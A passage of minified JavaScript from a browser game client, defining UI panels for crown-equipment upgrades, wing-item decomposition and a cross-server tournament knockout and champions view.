__extends(e,t),e.prototype.skinComplete=function(){this.attr.visible=!1,this.describe.visible=!1},e.prototype.dataChanged=function(){var t;this.data&&((null===(t=this.data)||void 0===t?void 0:t.skill)?this.currentState="skill":this.currentState="attr",this.validateNow(),this.setDatas())},e.prototype.setDatas=function(){var t,e,i,s=a.GlobalConfig.CrownCfg;this.skillname.text=s[this.data.crownId].name;var p=0,d=u.GodCrownCT.ins().nowShowSkillQ[this.data.crownId];if(d){if(d<this.data.equipQuality){var c=u.GodCrownCT.ins().returnVBCrowId(this.data.crownId),f=c.arr0;for(var g in f)f[g].eqQuilty>=this.data.equipQuality&&p++}}else{var c=u.GodCrownCT.ins().returnVBCrowId(this.data.crownId);if(c){var f=c.arr0;for(var g in f)f[g].eqQuilty>=this.data.equipQuality&&p++}}if(null===(t=this.data)||void 0===t?void 0:t.skill){this.describe.visible=!0;var m=a.GlobalConfig.SkillsConfig[null===(e=this.data)||void 0===e?void 0:e.skill];this.describe.textFlow=o.TextFlowMaker.generateTextFlow1(h.SkillUtil.getDesc(m,m.desc_ex)),this.skillicon.source=this.data.skill+"_png",this.require.text=gettext("镶嵌（{0}/{1}）{2}灵玉激活",this.data.equipNum,this.data.equipNum,r.QUALITY_NAME[this.data.equipQuality]),this.itemIndex>=u.GodCrownCT.ins().hasActCount&&(this.skillicon.filters=n.FilterUtil.ARRAY_GRAY_FILTER,this.describe.textColor=l.ItemUtil.getQualityColor(0),this.require.text=gettext("镶嵌（{0}/{1}）{2}灵玉激活",p,this.data.equipNum,r.QUALITY_NAME[this.data.equipQuality]))}else{this.attr.visible=!0,this.skillicon.visible=!1;var v=null===(i=this.data)||void 0===i?void 0:i.attr,y=u.GodCrownCT.ins().returnAttStr(v),f=y.split("\n"),C="";for(var g in f)C+=f[g]+"			";this.attr.text=C,this.require.text=gettext("镶嵌（{0}/{1}）{2}灵玉激活",this.data.partNum,this.data.partNum,r.QUALITY_NAME[this.data.equipQuality]),this.itemIndex>=u.GodCrownCT.ins().hasActCount&&(this.require.text=gettext("镶嵌（{0}/{1}）{2}灵玉激活",p,this.data.partNum,r.QUALITY_NAME[this.data.equipQuality]),this.attr.textColor=l.ItemUtil.getQualityColor(0))}this.require.textColor=this.skillname.textColor=l.ItemUtil.getQualityColor(this.data.equipQuality),this.itemIndex>=u.GodCrownCT.ins().hasActCount&&(this.require.textColor=l.ItemUtil.getQualityColor(0),this.skillname.textColor=l.ItemUtil.getQualityColor(0))},e}(s.BaseItemRender);e.CrownDetailsItem=p,window.CrownDetailsItem=p,__reflect(p.prototype,"CrownDetailsItem",[]),window.CrownDetailsItem=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CrownAttrItem=void 0;var n=i(3),o=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="CrownAttrSkin",e}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data){var t=this.data.split("：");this.names.text=t[0]+"：",this.value.text=t[1]+""}},e}(n.BaseItemRender);e.CrownAttrItem=o,window.CrownAttrItem=o,__reflect(o.prototype,"CrownAttrItem",[]),window.CrownAttrItem=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CrownEquipItem=void 0;var n=i(3),o=i(0),s=i(10),a=i(98),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="CrownEquipSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.touchEnabled=!0,this.touchChildren=!1,this.rp.visible=!1,this.colors=this.equipname.textColor},e.prototype.dataChanged=function(){if(this.data){var t=this.data,e=a.GodCrownCT.ins().returnEquipData(t);if(this.equipname.text=t.equipname,this.seclect.visible=!1,e){this.equipname.visible=this.itemicon.visible=this.bg.visible=!0,this.lock.visible=!1,this.bg.source="crown_frame"+(e.eqQuilty||0),this.itemicon.source=RES_DIR_ITEMICON+t.equipicon+".png"||!1,this.activatable.visible=!1;var i=o.GlobalConfig.CrownEquipCfg[t.crownId][t.equipId];if(i){var n=i[e.eqQuilty].equipname;this.equipname.text=n,this.equipname.textColor=s.ItemUtil.getQualityColor(e.eqQuilty)}var r=a.GodCrownCT.ins().returnEquipRed(t.crownId,t.equipId);this.rp.visible=r}else{this.bg.source="crown_frame0",this.bg.visible=this.lock.visible=!0,this.activatable.visible=!1,this.equipname.visible=this.itemicon.visible=this.rp.visible=!1;var l=a.GodCrownCT.ins().returnVBCrowId(t.crownId);this.equipname.textColor=this.colors,l?a.GodCrownCT.ins().judgeIsCan(t.cost)?(this.activatable.visible=!0,this.rp.visible=!0):this.activatable.visible=!1:this.rp.visible=!1}}},e.prototype.removeDisplay=function(){!this.skin},e.prototype.onClick=function(){a.GodCrownCT.ins().crownEquip=this.data,a.GodCrownCT.ins().updateCrownEquip()},e.prototype.updateSelect=function(){a.GodCrownCT.ins().crownEquip.crownId==this.data.crownId&&a.GodCrownCT.ins().crownEquip.equipId==this.data.equipId&&a.GodCrownCT.ins().crownEquip.quality==this.data.quality?this.seclect.visible=!0:this.seclect.visible=!1},e}(n.BaseItemRender);e.CrownEquipItem=r,window.CrownEquipItem=r,__reflect(r.prototype,"CrownEquipItem",[]),window.CrownEquipItem=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GodCrownQualityPanel=void 0;var n=i(1),o=i(110),s=i(0),a=i(10),r=i(132),l=i(2),h=i(98),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="UpgradeQualitySkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.costCmlist0.itemRenderer=o.CostComRender,this._curCostArr1=new eui.ArrayCollection,this.costCmlist0.dataProvider=this._curCostArr1},e.prototype.addDisplay=function(){this.addTouchEvent(this,this.onTap),observe(this,this.getQualityData,h.GodCrownCT.ins().postCrownUpDateObserve),this.getQualityData()},e.prototype.removeDisplay=function(){this.skin&&(this.removeObserve(),this.removeTouchEvent(this,this.onTap))},e.prototype.onTap=function(t){switch(t.target){case this.activateBtn:var e=h.GodCrownCT.ins().returnEquipData(h.GodCrownCT.ins().crownEquip),i=s.GlobalConfig.CrownEquipCfg;if(e){var n=i[h.GodCrownCT.ins().crownEquip.crownId][h.GodCrownCT.ins().crownEquip.equipId][e.eqQuilty+1];if(!n)return void l.TipsCT.ins().showTips(gettext("已满级"));if(!h.GodCrownCT.ins().judgeIsCan(n.cost))return void l.TipsCT.ins().showTips(gettext("材料不足"))}else{var n=i[h.GodCrownCT.ins().crownEquip.crownId][h.GodCrownCT.ins().crownEquip.equipId][1];if(!h.GodCrownCT.ins().judgeIsCan(n.cost))return void l.TipsCT.ins().showTips(gettext("材料不足"))}h.GodCrownCT.ins().sendCrownUp(h.GodCrownCT.ins().crownEquip.crownId,h.GodCrownCT.ins().crownEquip.equipId);break;case this.exitBtn:win.close(this)}},e.prototype.getQualityData=function(){var t=h.GodCrownCT.ins().returnEquipData(h.GodCrownCT.ins().crownEquip),e=s.GlobalConfig.CrownEquipCfg;if(this.maxAttg.visible=!1,this.activateBtn.visible=!0,t){var i=e[h.GodCrownCT.ins().crownEquip.crownId][h.GodCrownCT.ins().crownEquip.equipId][t.eqQuilty],n=e[h.GodCrownCT.ins().crownEquip.crownId][h.GodCrownCT.ins().crownEquip.equipId][t.eqQuilty+1];if(n){this.equip1.Quality=t.eqQuilty,this.equip2.Quality=t.eqQuilty+1;var o=i.attr,l=r.NebulaCT.ins().returnAttStr(o);this.nowAttr0.text=l;var u=n.attr,p=r.NebulaCT.ins().returnAttStr(u);this.nextAttr0.text=p;var d=[];for(var c in n.cost)d.push({cost:{type:n.cost[c].type,id:n.cost[c].id,count:n.cost[c].count},isShowHas:!0,isShowXh:!1});this._curCostArr1.source=d,this._curCostArr1.refresh(),this.activateBtn.label=gettext("附 灵")}else{this.nowAttg.visible=this.nextAttg.visible=!1,this.maxAttg.visible=!0,this.equip1.Quality=t.eqQuilty,this.equip2.Quality=t.eqQuilty;var o=i.attr,l=r.NebulaCT.ins().returnAttStr(o);this.maxAttr0.text=l;var d=[];this._curCostArr1.source=d,this._curCostArr1.refresh(),this.activateBtn.enabled=!1,this.activateBtn.label=gettext("Max")}}else{this.equip1.Quality=0,this.equip2.Quality=1;var u=e[h.GodCrownCT.ins().crownEquip.crownId][h.GodCrownCT.ins().crownEquip.equipId][1].attr,p=r.NebulaCT.ins().returnAttStr(u);this.nextAttr0.text=p;var f=e[h.GodCrownCT.ins().crownEquip.crownId][h.GodCrownCT.ins().crownEquip.equipId][1].cost.concat(),d=[];for(var c in f)d.push({cost:{type:f[c].type,id:f[c].id,count:f[c].count},isShowHas:!0,isShowXh:!1});this._curCostArr1.source=d,this._curCostArr1.refresh(),this.activateBtn.label=gettext("激 活")}this.equip1.data=e[h.GodCrownCT.ins().crownEquip.crownId][h.GodCrownCT.ins().crownEquip.equipId][1],this.equip2.data=e[h.GodCrownCT.ins().crownEquip.crownId][h.GodCrownCT.ins().crownEquip.equipId][1];var g=e[h.GodCrownCT.ins().crownEquip.crownId][h.GodCrownCT.ins().crownEquip.equipId][this.equip1.Quality||1].equipname,m=e[h.GodCrownCT.ins().crownEquip.crownId][h.GodCrownCT.ins().crownEquip.equipId][this.equip2.Quality||1].equipname;this.quality1.textColor=a.ItemUtil.getQualityColor(this.equip1.Quality),this.quality1.text=g,this.quality2.textColor=a.ItemUtil.getQualityColor(this.equip2.Quality),this.quality2.text=m},e}(n.BaseView);e.GodCrownQualityPanel=u,window.GodCrownQualityPanel=u,__reflect(u.prototype,"GodCrownQualityPanel",[]),window.GodCrownQualityPanel=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GodCrownSkillPanel=void 0;var n=i(1),o=i(0),s=i(98),a=i(417),r=i(423),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="InitialSkillSkin",e.isOpenSkillArr=[],e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){this.addTouchEvent(this,this.onTap);for(var t=0;this["skill"+t];)this.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onTap,this["skill"+t]),t++;this.setDatas()},e.prototype.removeDisplay=function(){if(this.skin){this.removeObserve();for(var t=0;this["skill"+t];)this.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.onTap,this["skill"+t]),t++;this.removeTouchEvent(this,this.onTap)}},e.prototype.onTap=function(t){switch(t.target){case this.exitBtn:win.close(this);break;case this.skill0:var e=!1;for(var i in this.isOpenSkillArr)1==this.isOpenSkillArr[i]&&(e=!0);e&&win.open(r.GodCrownSkillDetailsPanel,1);break;case this.skill1:var n=!1;for(var i in this.isOpenSkillArr)2==this.isOpenSkillArr[i]&&(n=!0);n&&win.open(r.GodCrownSkillDetailsPanel,2);break;case this.skill2:var o=!1;for(var i in this.isOpenSkillArr)3==this.isOpenSkillArr[i]&&(o=!0);o&&win.open(r.GodCrownSkillDetailsPanel,3);break;case this.skill3:var s=!1;for(var i in this.isOpenSkillArr)4==this.isOpenSkillArr[i]&&(s=!0);s&&win.open(r.GodCrownSkillDetailsPanel,4);break;case this.skill4:var l=!1;for(var i in this.isOpenSkillArr)5==this.isOpenSkillArr[i]&&(l=!0);l&&win.open(r.GodCrownSkillDetailsPanel,5);break;case this.skill5:var h=!1;for(var i in this.isOpenSkillArr)6==this.isOpenSkillArr[i]&&(h=!0);h&&win.open(r.GodCrownSkillDetailsPanel,6);break;case this.skilldetail:win.open(a.GodCrownDetailsPanel)}},e.prototype.setDatas=function(){var t=s.GodCrownCT.ins().GodCrownDadaList,e=o.GlobalConfig.CrownSkillCfg;this.isOpenSkillArr=[];var i=0,n=0;if(e){for(var a in t){var r=e[t[a].crownId];if(r){var l=[],h=t[a].arr0,u=h.length;if(u>0){var p=[];for(var d in r)u>=+d&&p.push(+d);for(var c in p){var f=r[p[c]];for(var g in f){var m=0;for(var v in h)h[v].eqQuilty>=+g&&m++;m>=p[c]&&(l[0]={quality:+g,count:p[c]})}}}if(l.length>0){var y=r[l[0].count][l[0].quality].skill;this["skill"+(t[a].crownId-1)].source=y+"_png",i++,this.isOpenSkillArr.push(t[a].crownId)}}}for(var a in e)n++}this.num.text=gettext("已激活的神冠之力（{0}/{1}）",i,n)},e}(n.BaseView);e.GodCrownSkillPanel=l,window.GodCrownSkillPanel=l,__reflect(l.prototype,"GodCrownSkillPanel",[]),window.GodCrownSkillPanel=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GodCrownSkillDetailsPanel=void 0;var n=i(5),o=i(1),s=i(0),a=i(65),r=i(98),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="SkillDetailsSkin",e.crownId=1,e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];t[0]&&(this.crownId=t[0]),this.setdata()},e.prototype.setdata=function(){var t=r.GodCrownCT.ins().returnVBCrowId(this.crownId),e=s.GlobalConfig.CrownSkillCfg;if(t){var i=e[t.crownId];if(i){var o=[],l=t.arr0,h=l.length;if(h>0){var u=[];for(var p in i)h>=+p&&u.push(+p);for(var d in u){var c=i[u[d]];for(var f in c){var g=0;for(var m in l)l[m].eqQuilty>=+f&&g++;g>=u[d]&&(o[0]={quality:+f,count:u[d]})}}}if(o.length>0){var v=i[o[0].count][o[0].quality].skill,y=s.GlobalConfig.SkillsConfig[v];if(y){this.skillicon.source=v+"_png";var C=s.GlobalConfig.SkillsDescConfig[y.desc];C&&(this.skillname.text=C.name,this.description.textFlow=n.TextFlowMaker.generateTextFlow1(a.SkillUtil.getDesc(y,y.desc_ex)))}}}}},e}(o.BaseView);e.GodCrownSkillDetailsPanel=l,window.GodCrownSkillDetailsPanel=l,__reflect(l.prototype,"GodCrownSkillDetailsPanel",[]),window.GodCrownSkillDetailsPanel=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GwWeaponItem=void 0;var n=i(3),o=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.nameArr=[gettext("狂风项链"),gettext("雷霆之刃")],e}return __extends(e,t),e.prototype.dataChanged=function(){this.labelDisplay.text=""+(this.nameArr[this.itemIndex]||"")},e}(n.BaseItemRender);e.GwWeaponItem=o,window.GwWeaponItem=o,__reflect(o.prototype,"GwWeaponItem",[]),window.GwWeaponItem=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GodWingSelectItemRender=e.GodWingDescomWin=void 0;var n=i(19),o=i(3),s=i(1),a=i(11),r=i(0),l=i(4),h=i(6),u=i(99),p=i(2),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="DecomposeSkin",e.noneArrs=[0,0,0,0,0],e.decomposeItemArr=[],e.costCoin=0,e.isNull=!1,e.descomposeList=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.propList0.itemRenderer=c,this.propList0.dataProvider=this.bc=new eui.ArrayCollection(this.noneArrs),this.propList.itemRenderer=a.ItemBase,this.propList.dataProvider=new eui.ArrayCollection([0,0,0,0,0]),this.propList0.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onItemClick,this),this.txt_desc0.text=gettext("自动勾选低于等于穿戴的部件")},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.coinGrop.visible=!1,this.addTouchEvent(this.eBtn,this.onClick),this.addTouchEvent(this.eBtn0,this.onClick),this.clearAllSelect(),this.updateDescomposeList()},e.prototype.updateDescomposeList=function(){var t=u.WingCC.getGodWingDecomItemList();if(this.descomposeList=[],t&&t.length>0)for(var e=0;e<t.length;e++){var i=t[e].deepClone();if(i.count>1)for(var n=0;n<i.count;n++)this.descomposeList.push(i);else this.descomposeList.push(i)}if(0==this.descomposeList.length)this.isNull=!0,this.bc.replaceAll(this.noneArrs);else{this.isNull=!1;for(var e=0;e<this.descomposeList.length;e++)this.descomposeList[e].count=1;this.bc.replaceAll(this.descomposeList)}this.setAwardList()},e.prototype.setAwardList=function(){this.costCoin=0;var t=[];this.decomposeItemArr=[];for(var e=0;e<this.propList0.numElements;e++){var i=this.propList0.getElementAt(e);if(i&&i.isSelect){var n=this.getSynConfig(i.data.configID);if(!n)continue;var o={id:n.index,count:i.data.count};this.decomposeItemArr.push(o),t.push(o)}}for(var s=[],e=0;e<t.length;e++){var n=r.GlobalConfig.SyntheticConfig[t[e].id];if(n){var a=n.target,h=t[e].count;n.cost[1]&&(this.costCoin+=n.cost[1].count*h);for(var u=0;u<(null===a||void 0===a?void 0:a.length);u++){var p={type:a[u].type,id:a[u].id,count:a[u].count*h};s.push(p)}}}s.length>0?this.propList.dataProvider=new eui.ArrayCollection(s):this.propList.dataProvider=new eui.ArrayCollection([0,0,0,0,0]),this.txt_cost.text=this.costCoin+"/"+l.ActorCC.gold,this.coinGrop.visible=this.costCoin>0},e.prototype.getSynConfig=function(t){var e=r.GlobalConfig.GodWingItemConfig[t];if(!e)return null;var i=e.decomId;return r.GlobalConfig.SyntheticConfig[i]},e.prototype.onItemClick=function(t){if(!this.isNull){if(t){var e=t.itemRenderer;e&&(e.isSelect?e.setSelect(!1):e.setSelect(!0))}this.setAwardList()}},e.prototype.onClick=function(t){switch(t.target){case this.eBtn:this.clearAllSelect();for(var e=0;e<this.propList0.numElements;e++){var i=this.propList0.getElementAt(e);i&&u.WingCC.checkGodWingIsDescom(i.data.configID)&&i.setSelect(!0)}this.setAwardList();break;case this.eBtn0:if(this.decomposeItemArr.length<=0)return void p.TipsCT.ins().showTips(gettext("没有可分解装备"));if(!n.GlobalFun.checkCost(this.costCoin,1,"",!0))return;if(h.BagCT.ins().getAllSurplusCount(1)<0)return void p.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));h.BagCT.ins().sendMergeMost(this.decomposeItemArr,0),win.close(this)}},e.prototype.clearAllSelect=function(){this.decomposeItemArr=[],this.costCoin=0;for(var t=0;t<this.propList0.numElements;t++){var e=this.propList0.getElementAt(t);e&&e.setSelect(!1)}},e}(s.BaseView);e.GodWingDescomWin=d,window.GodWingDescomWin=d,__reflect(d.prototype,"GodWingDescomWin",[]),window.GodWingDescomWin=d;var c=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.isSelect=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.select2.visible=this.select.visible=!1,this.gift.enabled=!1},e.prototype.dataChanged=function(){this.data?this.gift.data=this.data:this.select.visible=this.select2.visible=!1},e.prototype.setSelect=function(t){this.isSelect=t,this.select2.visible=this.isSelect},e}(o.BaseItemRender);e.GodWingSelectItemRender=c,window.GodWingSelectItemRender=c,__reflect(c.prototype,"GodWingSelectItemRender",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GodWingChangeItem=void 0;var n=i(3),o=i(22),s=i(72),a=i(0),r=i(6),l=i(86),h=i(99),u=i(2),p=i(199),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ShenYuEquipChangeItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.arrows.visible=this.best.visible=!1,observe(this,this.dataChanged,l.SkillCT.ins().updateSkillVule),observe(this,this.dataChanged,l.SkillCT.ins().postSkillUpgrade),this.addTouchEndEvent(this.btnChange,this.onClick)},e.prototype.dataChanged=function(){if(this.itemData=this.data.item,this.itemData){this.item.data=this.itemData,this.gwconfig=a.GlobalConfig.GodWingItemConfig[this.itemData.itemConfig.id];var t=o.AttributeData.getAttStr1(this.gwconfig.attr,s.AttributeFormat.FORMAT_0())+"\n";if(this.gwconfig.exattr&&this.gwconfig.exattr.length&&(t+=o.AttributeData.getExAttrNameByAttrbute(this.gwconfig.exattr[0])),this.skillDes.text=t,this.arrows.visible=this.best.visible=this.data.isBest,this.arrows.visible){var e=egret.Tween.get(this.arrows,{loop:!0});e.to({y:this.arrows.y-3},250).to({y:this.arrows.y+3},250)}else egret.Tween.removeTweens(this.arrows)}},e.prototype.onClick=function(t){return r.BagCT.ins().getAllSurplusCount(1)<0?void u.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容")):(h.WingCC.wearGodWing(0,this.itemData.itemConfig.id,this.gwconfig.slot),void win.close(p.GodWingChangePanel))},e.prototype.ClearObj=function(){this.skin&&(delMsg(this),egret.Tween.removeTweens(this.arrows))},e}(n.BaseItemRender);e.GodWingChangeItem=d,window.GodWingChangeItem=d,__reflect(d.prototype,"GodWingChangeItem",[]),window.GodWingChangeItem=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HSKnockoutPanel=void 0;var n=i(18),o=i(8),s=i(16),a=i(5),r=i(1),l=i(0),h=i(4),u=i(7),p=i(46),d=i(109),c=i(996),f=function(t){function e(){var e=t.call(this)||this;return e._sn_="HSKnockoutSkin",e.isInit=!0,e.times1="",e.left=0,e.right=0,e.top=0,e.bottom=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=c.HSKnockoutItem,this.list=new eui.ArrayCollection,this.eList.dataProvider=this.list;var t=new Date(p.HegemonyCT.ins().openTime),e=t.getMonth()+1,i=t.getDate(),n=t.getHours(),o=t.getMinutes();this.openTime.text=""+e+gettext("月")+i+gettext("日")+" "+n+":"+(o?o:"00"),this.rule.textFlow=a.TextFlowMaker.generateTextFlow(l.GlobalConfig.LfRaceBase.knockOutRule)},e.prototype.addDisplay=function(){this.observe(p.HegemonyCT.ins().postKnockoutData,this.updateState),this.setTime(),Timer.has(this.setTime,this)||Timer.start(1e3,0,this.setTime,this),this.update()},e.prototype.removeDisplay=function(){Timer.stopAll(this)},e.prototype.update=function(){this.battleTime<=0&&p.HegemonyCT.ins().delegate==h.ActorCC.actorID?(p.HegemonyCT.ins().sendKnockoutData(),this.outGroup.visible=!0,this.ruleGroup.visible=!1,this.updateState()):(this.outGroup.visible=!1,this.ruleGroup.visible=!0,this.openGroup.visible=p.HegemonyCT.ins().delegate==h.ActorCC.actorID,this.reGroup.visible=this.openGroup.visible,this.otherGroup.visible=!this.openGroup.visible,this.otherGroup.visible&&(Timer.stop(this.updateTime,this),Timer.start(1e3,0,this.updateTime,this),this.updateTime(),this.countdown.text=this.times1))},e.prototype.updateState=function(){var t=p.HegemonyCT.ins().knockoutInfo;if(t&&t[0]){var e=t[0].knockoutData,i=t[0].round,o=t[0].servers;this.list.replaceAll(e),s.DisplayUtils.scrollerToBottom(this.eScroller);var r=gettext("，我的战绩："),h=p.HegemonyCT.ins().calcWinNum();if(e.length-h>=l.GlobalConfig.LfRaceBase.KnockOutLimit)r="|C:"+n.ColorUtil.RED+"&T:"+gettext("(您已经被淘汰)")+"|",this.times.visible=this.state.visible=!1;else{var u=0>i-h?0:i-h;r+=""+h+gettext("胜")+u+gettext("负"),Timer.stop(this.onTime,this),Timer.start(1e3,0,this.onTime,this),this.onTime(),this.state.visible=!!t[0].nextTimes}this.endtime.visible=!1;var d="";t[0].nextTimes?d=gettext("当前淘汰赛第{0}轮，剩余{1}人 {2}",i,o,r):(Timer.stop(this.updateTime,this),Timer.start(1e3,0,this.updateTime,this),this.updateTime(),i?d=gettext("淘汰赛已结束")+" "+r:(d=gettext("淘汰赛已轮空并结束"),this.endtime.visible=!0)),this.desc.textFlow=a.TextFlowMaker.generateTextFlow1(d)}},e.prototype.updateTime=function(){var t=Math.floor((p.HegemonyCT.ins().nextOpenTime-u.GameServerCC.serverTime)/1e3);t>0?(this.times1=o.DateUtils.getFormatBySecond(t,o.DateUtils.TIME_FORMAT_5,3),this.endtime.text=gettext("小组赛开始倒计时：")+this.times1):(Timer.stop(this.updateTime,this),this.times1=this.endtime.text="")},e.prototype.setTime=function(){var t="";this.battleTime=Math.floor((p.HegemonyCT.ins().openTime-u.GameServerCC.serverTime)/1e3),this.battleTime>0?(t=o.DateUtils.getFormatBySecond(this.battleTime,o.DateUtils.TIME_FORMAT_5,3),p.HegemonyCT.ins().oFirstTap&&(p.HegemonyCT.ins().oFirstTap=!1,d.HegemonyRedPoint.ins().postRedPoint())):(this.isInit&&(this.isInit=!1,this.update()),Timer.stop(this.setTime,this)),this.leftTime.text=t},e.prototype.onTime=function(){var t=Math.floor((o.DateUtils.formatMiniDateTime(p.HegemonyCT.ins().knockoutInfo[0].nextTimes)-u.GameServerCC.serverTime)/1e3);t>0?this.times.text=o.DateUtils.getFormatBySecond(t):(Timer.stop(this.onTime,this),this.times.text="")},e}(r.BaseView);e.HSKnockoutPanel=f,window.HSKnockoutPanel=f,__reflect(f.prototype,"HSKnockoutPanel",[]),window.HSKnockoutPanel=f},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HSPreEventsPanel=void 0;var n=i(21),o=i(42),s=i(1),a=i(0),r=i(44),l=i(46),h=i(257),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="HSPreviousEventsCItem",e.tabSelect=0,e.curGroup=1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.roleGrp.visible=this.titleGroup.visible=this.eTab.visible=this.descGroup.visible=!1,this.roleGrp.touchChildren=!1,this.tab.itemRenderer=h.HSTabItem,this.addTouchEvent(this,this.onTouch),this.tab.visible=!1;for(var t=[],e=1;3>=e;e++)t.push({groupId:e,icon:a.GlobalConfig.LfRaceBase.groupIcon[e]});this.eTab.dataProvider=new eui.ArrayCollection(t),this.addChangeEvent(this.eTab,this.onGroupTap)},e.prototype.addDisplay=function(){this._openOtherWin=!1,this.observe(l.HegemonyCT.ins().postInit,this.update),this.observe(l.HegemonyCT.ins().postState,this.update),this.observe(l.HegemonyCT.ins().postChampion,this.checkPlayer),this.addChangeEvent(this.tab,this.onTap),this.observe(r.ReadPlayerCT.ins().postGetPlayerResult,this.openOtherPlayerView),this.update(),this.onChange()},e.prototype.removeDisplay=function(){this._openOtherWin=!1,this.titleMc&&(this.titleMc.stop(),this.titleMc=null),Timer.stopAll(this)},e.prototype.checkPlayer=function(){var t=l.HegemonyCT.ins();if(this.updateView(),t.championNO==this.selectNo){var e=l.HegemonyCT.ins().championInfoDic[t.championPlayer]&&l.HegemonyCT.ins().championInfoDic[t.championPlayer].data;e?this.openOtherPlayerView(e):r.ReadPlayerCT.ins().sendFindPlayer(t.championPlayer,t.curServerId)}},e.prototype.update=function(){this.tab.visible=!0;for(var t=[],e=l.HegemonyCT.ins(),i=e.NO;i>0;i--)t.push(i);this.tab.dataProvider=new eui.ArrayCollection(t),t[this.tabSelect]&&(this.selectNo=t[this.tabSelect]),this.updateView()},e.prototype.updateView=function(){this.selectNo>0?this.roleGrp.visible=this.titleGroup.visible=this.eTab.visible=this.descGroup.visible=!0:this.roleGrp.visible=this.titleGroup.visible=this.eTab.visible=this.descGroup.visible=!1,this.name0.text=gettext("虚位以待"),this.roleItem.visible=!1,this.titleMc&&(this.titleMc.stop(),this.titleMc=null)},e.prototype.onTap=function(){this.tabSelect=this.tab.selectedIndex,this.update(),this.onChange()},e.prototype.onGroupTap=function(){this.curGroup=this.eTab.selectedItem.groupId,this.onChange()},e.prototype.onTouch=function(t){switch(t.target){case this.roleGrp:var e=l.HegemonyCT.ins();e.championNO==this.selectNo&&(this._openOtherWin=!0,r.ReadPlayerCT.ins().sendFindPlayer(e.championPlayer,e.curServerId))}},e.prototype.onChange=function(){this.info.text="",this.desc.text=gettext("第{0}届诸神之战{1}冠军",o.StringUtils.NumberToChinese(this.selectNo),a.GlobalConfig.LfRaceBase.groupName[this.curGroup-1]),this._openOtherWin=!1,this.updateView(),l.HegemonyCT.ins().sendChampionInfo(this.selectNo,this.curGroup)},e.prototype.openOtherPlayerView=function(t){if(this.otherPlayerData=t,this.descGroup.visible?this.info.text=t.serverId+t.name+t.guildName+"":this.info.text="",this._openOtherWin)win.open("RRoleWin",t),this._openOtherWin=!1;else if(l.HegemonyCT.ins().championNO==this.selectNo){this.roleItem.visible=!0,this.name0.text="S."+t.serverId+t.name;var e=t.roleData[0];if(e){this.roleGrp.visible=!0,this.roleImg.source="job"+(e.job-1);var i={name:t.name,level:t.level,job:e.job,outward:e.outward,titleID:e.titleID,wingID:e.wingID,demonCirID:e.demonCirID};this.roleItem.data=i}}},e.prototype.setEffect=function(t,e,i,o,s){s||(s=new n.MovieClip);var r=a.GlobalConfig.EquipWithEffConfig[t+"_"+i];r?(s.scaleX=s.scaleY=r.scaling,s.parent||o.addChild(s),s.x=this[e+i].x+r.offX,s.y=this[e+i].y+r.offY,s.playFile(RES_DIR_EFF+r.inShowEff,-1)):s.parent&&s.parent.removeChild(s)},e.prototype.getZhuangbanById=function(t){for(var e in a.GlobalConfig.ZhuangBanId)if(a.GlobalConfig.ZhuangBanId[e].id==t)return a.GlobalConfig.ZhuangBanId[e];return null},e}(s.BaseView);e.HSPreEventsPanel=u,window.HSPreEventsPanel=u,__reflect(u.prototype,"HSPreEventsPanel",[]),window.HSPreEventsPanel=u},function(t,e,i){"use strict";
